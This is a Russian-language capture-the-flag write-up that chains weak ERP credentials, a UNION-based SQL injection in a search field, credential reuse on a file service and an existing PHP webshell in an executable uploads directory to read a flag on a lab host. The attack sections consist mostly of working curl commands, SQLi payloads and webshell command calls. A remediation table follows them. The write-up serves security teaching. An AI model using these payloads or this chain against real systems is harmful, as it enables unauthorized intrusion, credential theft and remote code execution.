# Первая кровь — HackerLab CTF WriteUp

**Платформа:** HackerLab / Codeby CTF  
**Категория:** Web / Pentest  
**Сложность:** Medium  
**Цель:** 62.173.140.174:16305  
**Основной домен:** <code>company.ctf</code>  
**Флаг:** <code>CODEBY{C0mpr0m1s3d_v1a_Ch41n3d_Vuln3r4b1l1t13s}</code>

---

## Содержание

1. [Разведка и виртуальные хосты](#1-разведка-и-виртуальные-хосты)
2. [Первичный доступ к ERP](#2-первичный-доступ-к-erp)
3. [SQL-инъекция в поиске ERP](#3-sql-инъекция-в-поиске-erp)
4. [Компрометация файлового сервиса](#4-компрометация-файлового-сервиса)
5. [RCE через исполняемый файл из uploads](#5-rce-через-исполняемый-файл-из-uploads)
6. [Получение флага](#6-получение-флага)
7. [Полная цепочка атаки](#7-полная-цепочка-атаки)
8. [Уязвимости и рекомендации](#8-уязвимости-и-рекомендации)
9. [Использованные инструменты](#9-использованные-инструменты)

---

## 1. Разведка и виртуальные хосты

### Условие

Сервис на выданном IP перенаправляет на виртуальный хост ERP. В условии также сказано, что в зоне <code>company.ctf</code> могут быть дополнительные поддомены.

### Первичный запрос

~~~bash
curl -i http://62.173.140.174:16305/
~~~

Ответ:

~~~
HTTP/1.1 301 Moved Permanently
Server: nginx/1.31.6
Location: http://erp.company.ctf:16305/
~~~

Добавляю IP и найденные виртуальные хосты в hosts:

~~~bash
echo '62.173.140.174 company.ctf erp.company.ctf api.company.ctf files.company.ctf' | sudo tee -a /etc/hosts
~~~

### Перечисление vhost

Для поиска поддоменов сравниваем ответы nginx по заголовку <code>Host</code>. Несуществующий хост отдаёт стандартный редирект размером 169 байт, поэтому его удобно исключить:

~~~bash
ffuf -u http://62.173.140.174:16305/ -H 'Host: FUZZ.company.ctf' -w subdomains.txt -fs 169
~~~

Найдены три полезных виртуальных хоста:

| Хост | Ответ | Наблюдение |
|---|---:|---|
| <code>erp.company.ctf</code> | 302 | Перенаправление на <code>login.php</code> |
| <code>files.company.ctf</code> | 200 | Отдельная форма входа в файловый сервис |
| <code>api.company.ctf</code> | 401 | JSON: <code>API key is required</code> |

У API есть дополнительная утечка отладочной информации. Непустой заголовок <code>X-API-Key</code> приводит к раскрытию пути и номера строки:

~~~bash
curl -sS -H 'Host: api.company.ctf' -H 'X-API-Key: test' http://62.173.140.174:16305/
~~~

~~~
Fatal error: Uncaught Error: Call to a member function bind_param() on bool
in /var/www/html/api/index.php:22
~~~

API не потребовался для финальной цепочки, но это отдельная проблема раскрытия служебной информации.

---

## 2. Первичный доступ к ERP

### Форма входа

Страница <code>http://erp.company.ctf:16305/login.php</code> содержит обычную форму с полями <code>username</code> и <code>password</code>. MFA, CAPTCHA и заметное ограничение попыток входа отсутствуют.

В рамках учебного стенда проверка небольшой выборки распространённых комбинаций дала действующую учётную запись:

~~~
admin : admin123
~~~

Авторизация воспроизводится запросом:

~~~bash
curl -sS -i --resolve erp.company.ctf:16305:62.173.140.174 -c erp.cookies -b erp.cookies --data-urlencode 'username=admin' --data-urlencode 'password=admin123' http://erp.company.ctf:16305/login.php
~~~

Успешный ответ:

~~~
HTTP/1.1 302 Found
Location: index.php
~~~

После перехода на <code>index.php</code> открывается панель ERP с таблицей клиентов и строкой поиска. Поиск становится точкой дальнейшей атаки.

---

## 3. SQL-инъекция в поиске ERP

### Подтверждение SQLi

Параметр <code>search</code> передаётся в SQL-запрос без параметризации. Одинарная кавычка вызывает подробную ошибку MySQL:

~~~bash
curl -sS --resolve erp.company.ctf:16305:62.173.140.174 -b erp.cookies --get --data-urlencode "search='" http://erp.company.ctf:16305/index.php
~~~

Фрагмент ответа:

~~~
Ошибка в запросе: You have an error in your SQL syntax;
... near '%' OR email LIKE '%'%' OR phone LIKE '%'%'' at line 1
~~~

Из текста ошибки можно восстановить логику исходного запроса: значение поиска подставляется как минимум в условия вида <code>name LIKE '%&lt;search&gt;%'</code>, <code>email LIKE ...</code> и <code>phone LIKE ...</code>. Это классическая SQL-инъекция через конкатенацию пользовательского ввода.

### Определение числа столбцов

Вариант <code>UNION SELECT</code> с пятью полями даёт ошибку о разном количестве столбцов. Вариант с шестью полями выполняется:

~~~bash
curl -sS --resolve erp.company.ctf:16305:62.173.140.174 -b erp.cookies --get --data-urlencode "search=%' UNION SELECT 1,2,3,4,5,6 -- -" http://erp.company.ctf:16305/index.php
~~~

В HTML появляются значения <code>1</code>–<code>5</code>; шестой столбец участвует в исходном запросе, но не отображается в таблице. Для дальнейших <code>UNION</code>-запросов используем шесть значений.

### Перечисление таблиц

~~~bash
PAYLOAD="%' UNION SELECT 999,GROUP_CONCAT(table_name),3,4,5,6 FROM information_schema.tables WHERE table_schema=DATABASE() -- -"
curl -sS --resolve erp.company.ctf:16305:62.173.140.174 -b erp.cookies --get --data-urlencode "search=$PAYLOAD" http://erp.company.ctf:16305/index.php
~~~

Результат, попавший во второй отображаемый столбец:

~~~
clients,config,files,logs,users
~~~

Структура интересующей таблицы <code>config</code>:

~~~bash
PAYLOAD="%' UNION SELECT 999,GROUP_CONCAT(column_name),3,4,5,6 FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='config' -- -"
curl -sS --resolve erp.company.ctf:16305:62.173.140.174 -b erp.cookies --get --data-urlencode "search=$PAYLOAD" http://erp.company.ctf:16305/index.php
~~~

~~~
id,name,value,description,updated_at
~~~

### Извлечение конфигурации

Для вывода параметров конфигурации объединяем имя, значение и описание:

~~~bash
PAYLOAD="%' UNION SELECT 999,GROUP_CONCAT(CONCAT_WS(0x3a,name,value,description) SEPARATOR 0x7c),3,4,5,6 FROM config -- -"
curl -sS --resolve erp.company.ctf:16305:62.173.140.174 -b erp.cookies --get --data-urlencode "search=$PAYLOAD" http://erp.company.ctf:16305/index.php
~~~

Среди полученных параметров находится секрет файлового сервиса:

~~~
file_service_credentials:
Логин: file_admin, Пароль: fuckyooh21:
Учетные данные для доступа к файловому сервису
~~~

Также конфигурация раскрывает путь для загружаемых файлов:

~~~
upload_dir:/var/www/html/files/uploads/
~~~

**Вывод:** одна SQL-инъекция в ERP позволяет читать произвольные данные из БД, включая конфигурацию и учётные данные соседнего приложения.

---

## 4. Компрометация файлового сервиса

### Вход с учётными данными из ERP

~~~bash
curl -sS -i --resolve files.company.ctf:16305:62.173.140.174 -c files.cookies -b files.cookies --data-urlencode 'username=file_admin' --data-urlencode 'password=fuckyooh21' http://files.company.ctf:16305/index.php
~~~

После входа доступен список файлов и ссылка на <code>nginx.conf</code>. В списке уже присутствуют:

| ID | Имя | Путь |
|---:|---|---|
| 1 | <code>shell.php</code> | <code>uploads/6ab4e4d28a451_shell.php</code> |
| 2 | <code>t.php</code> | <code>uploads/6acb6dbfcb29e_t.php</code> |
| 3 | <code>t2.jpg</code> | <code>uploads/6acb6dbfe6d95_t2.jpg</code> |

### Ошибка конфигурации uploads

Конфигурационный файл доступен пользователю файлового сервиса:

~~~bash
curl -sS --resolve files.company.ctf:16305:62.173.140.174 -b files.cookies http://files.company.ctf:16305/nginx.conf
~~~

Критичные фрагменты:

~~~nginx
location /uploads {
    alias /var/www/html/files/uploads;
    autoindex off;
}

location ~ \.php$ {
    fastcgi_pass php:9000;
    fastcgi_index index.php;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    include fastcgi_params;
}
~~~

Директория с пользовательскими файлами находится в web-root, а generic PHP-обработчик исполняет файлы с расширением <code>.php</code>. На практике запрос к уже существующему <code>uploads/...php</code> не скачивает файл, а запускает PHP-код.

---

## 5. RCE через исполняемый файл из uploads

### Подтверждение webshell

Открытие <code>shell.php</code> без параметров выдаёт:

~~~bash
curl -sS --resolve files.company.ctf:16305:62.173.140.174 http://files.company.ctf:16305/uploads/6ab4e4d28a451_shell.php
~~~

~~~
SHELL_OK:
Warning: system(): Cannot execute a blank command ...
~~~

Это указывает, что файл передаёт пользовательский параметр в <code>system()</code>. Параметр называется <code>cmd</code>:

~~~bash
curl -sS --get --resolve files.company.ctf:16305:62.173.140.174 --data-urlencode 'cmd=id' http://files.company.ctf:16305/uploads/6ab4e4d28a451_shell.php
~~~

Результат:

~~~
SHELL_OK:uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

Таким образом, получено удалённое выполнение команд от имени <code>www-data</code>. Для получения флага не требовалось загружать новый файл или менять состояние сервиса: использовался уже доступный в учебной среде исполняемый файл.

---

## 6. Получение флага

### Поиск файла

~~~bash
curl -sS --get --resolve files.company.ctf:16305:62.173.140.174 --data-urlencode 'cmd=find / -maxdepth 3 -type f -iname "*flag*" 2>/dev/null' http://files.company.ctf:16305/uploads/6ab4e4d28a451_shell.php
~~~

~~~
SHELL_OK:/home/flag.txt
~~~

### Чтение флага

~~~bash
curl -sS --get --resolve files.company.ctf:16305:62.173.140.174 --data-urlencode 'cmd=cat /home/flag.txt' http://files.company.ctf:16305/uploads/6ab4e4d28a451_shell.php
~~~

~~~
SHELL_OK:CODEBY{C0mpr0m1s3d_v1a_Ch41n3d_Vuln3r4b1l1t13s}
~~~

**Флаг:**

~~~
CODEBY{C0mpr0m1s3d_v1a_Ch41n3d_Vuln3r4b1l1t13s}
~~~

---

## 7. Полная цепочка атаки

~~~text
62.173.140.174:16305
  │
  ├─ HTTP 301 → erp.company.ctf
  │
  ├─ Слабые учётные данные
  │    admin : admin123
  │
  ├─ ERP index.php?search= → SQL injection
  │    │
  │    └─ таблица config
  │         │
  │         └─ file_admin : fuckyooh21
  │
  ├─ files.company.ctf
  │    │
  │    ├─ доступ к nginx.conf
  │    └─ uploads/*.php исполняются PHP-FPM
  │
  ├─ Уже загруженный shell.php?cmd=
  │    │
  │    └─ RCE как www-data
  │
  └─ /home/flag.txt
       │
       └─ CODEBY{C0mpr0m1s3d_v1a_Ch41n3d_Vuln3r4b1l1t13s}
~~~

Цепочка показывает важный принцип: несколько на первый взгляд небольших ошибок — слабый пароль, SQLi, открытая конфигурация и исполняемые загрузки — вместе превращаются в полную компрометацию сервера.

---

## 8. Уязвимости и рекомендации

| Проблема | Последствие | Исправление |
|---|---|---|
| Слабый пароль <code>admin:admin123</code> | Первичный доступ в ERP | Случайные уникальные пароли, MFA, ограничение попыток и мониторинг входов |
| SQL-инъекция в <code>search</code> | Чтение БД и межсервисных секретов | Prepared statements, allow-list для поиска, скрытие SQL-ошибок |
| Пароли файлового сервиса в таблице <code>config</code> | Латеральное перемещение в <code>files.company.ctf</code> | Secrets manager/переменные окружения, хранение только хешей паролей, минимальные права сервисных учётных записей |
| Доступ к <code>nginx.conf</code> пользователю приложения | Раскрытие внутренней архитектуры и путей | Не публиковать конфигурацию веб-сервера в document root |
| <code>uploads</code> в web-root и исполнение PHP | RCE при наличии или загрузке PHP-файла | Хранить файлы вне web-root; запретить обработку PHP в uploads; allow-list расширений и MIME |
| <code>display_errors</code> у API | Раскрытие пути, реализации и номера строки | Отключить отображение ошибок в production, логировать исключения только на сервере |

### Приоритет исправлений

1. Немедленно запретить выполнение скриптов в uploads и удалить уже загруженные исполняемые файлы.
2. Исправить SQLi через параметризованные запросы и отозвать все раскрытые учётные данные.
3. Сменить пароли администраторов, включить MFA и защиту от password spraying.
4. Убрать конфигурационные файлы и отладочные сообщения из внешнего доступа.
5. Провести аудит остальных vhost и БД на аналогичные секреты и SQLi.

---

## 9. Использованные инструменты

| Инструмент | Назначение |
|---|---|
| <code>curl</code> | HTTP-разведка, авторизация, воспроизведение SQLi и проверка ответов |
| <code>ffuf</code> | Перечисление виртуальных хостов |
| <code>find</code>, <code>cat</code> | Проверка расположения флага после подтверждённого RCE в CTF-среде |

---

## Итог

Вектор атаки состоял из четырёх связанных ошибок: слабая учётная запись ERP, SQL-инъекция в поиске, plaintext-секрет соседнего сервиса и выполнение PHP в пользовательском каталоге uploads. Каждая проблема должна быть закрыта отдельно; вместе они дают атакующему путь от внешнего HTTP-запроса до чтения файлов на сервере.

Все действия и команды в этом writeup относятся исключительно к выданному CTF-стенду.
